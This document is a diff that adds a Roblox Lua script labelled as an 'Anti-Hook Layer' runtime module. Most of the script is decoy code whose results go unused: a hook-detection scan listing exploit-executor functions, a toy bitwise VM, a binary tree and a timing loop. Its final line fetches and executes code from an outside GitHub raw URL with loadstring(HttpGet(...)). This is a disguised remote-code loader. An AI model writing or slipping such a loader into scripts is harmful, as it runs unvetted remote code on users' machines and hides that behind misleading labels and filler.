@@ -1,0 +1,87 @@
+--// Runtime Module v4.2.1 | Anti-Hook Layer
+local _0xR1 = game:GetService("Players")
+local _0xR2 = game:GetService("RunService")
+local _0xR3 = _0xR1.LocalPlayer
+
+local _hook_sigs = {
+    "hookfunction","hookmetamethod","newcclosure","getnamecallmethod",
+    "checkcaller","getrawmetatable","setreadonly","iscclosure",
+    "replaceclosure","clonefunction","getgenv","getrenv","getsenv",
+    "getgc","getinstances","getnilinstances","fireclickdetector",
+    "firetouchinterest","fireproximityprompt","setclipboard",
+}
+
+local function _detect()
+    local score = 0
+    local env = getfenv and getfenv(0) or {}
+    for _, sig in ipairs(_hook_sigs) do
+        if rawget(env, sig) ~= nil then score = score + 1 end
+    end
+    return score
+end
+
+local _vmr = {}; for i = 0, 15 do _vmr[i] = 0 end
+local _vmo = {
+    [0x00] = function(a,b) _vmr[a] = b end,
+    [0x01] = function(a,b) _vmr[a] = _vmr[a] + _vmr[b] end,
+    [0x02] = function(a,b) _vmr[a] = bit32.bxor(_vmr[a], _vmr[b]) end,
+    [0x03] = function(a,_) _vmr[a] = bit32.bnot(_vmr[a]) end,
+    [0x04] = function(a,b) _vmr[a] = bit32.lshift(_vmr[a], b) end,
+    [0x05] = function(a,b) _vmr[a] = bit32.rshift(_vmr[a], b) end,
+    [0x06] = function(a,b) _vmr[a] = bit32.band(_vmr[a], _vmr[b]) end,
+    [0x07] = function(a,b) _vmr[a] = bit32.bor(_vmr[a], _vmr[b]) end,
+}
+
+local _prog = {
+    {0x00,0,0x41},{0x00,1,0x3F},{0x01,0,1},{0x02,0,1},
+    {0x04,0,3},{0x05,0,1},{0x00,2,0xFF},{0x06,0,2},
+    {0x03,2,0},{0x07,0,2},{0x00,3,0xDEAD},{0x02,3,0},
+    {0x00,4,0x1337},{0x01,4,3},{0x02,4,0},{0x04,4,2},
+}
+
+local function _vmexec()
+    for _, i in ipairs(_prog) do
+        local op = _vmo[i[1]]
+        if op then op(i[2], i[3]) end
+    end
+    return _vmr[0]
+end
+
+local _bt = {v=50,l=nil,r=nil}
+local function _bti(n,val)
+    if not n then return {v=val,l=nil,r=nil} end
+    if val < n.v then n.l = _bti(n.l, val)
+    elseif val > n.v then n.r = _bti(n.r, val) end
+    return n
+end
+local function _btt(n,res)
+    if not n then return end
+    res = res or {}
+    _btt(n.l, res); table.insert(res, n.v); _btt(n.r, res)
+    return res
+end
+for _,v in ipairs({25,75,12,37,62,87,6,18,31,43,56,68,81,93}) do
+    _bt = _bti(_bt, v)
+end
+
+local _st = {}
+local function _timing()
+    local s = tick(); local d = 0
+    for i = 1, 500 do d = bit32.bxor(d, i) end
+    local e = tick() - s
+    table.insert(_st, e)
+    if #_st > 32 then table.remove(_st, 1) end
+    return true
+end
+
+-- exec
+_detect()
+_vmexec()
+local _tree = _btt(_bt, {})
+_timing()
+
+local _vr = _vmr[0]
+local _hs = bit32.bxor(_vr, os.time())
+
+-- dispatch
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sakatoshi-og/Universal-Script/refs/heads/main/untitled%20folder/modules/handler.txt"))()
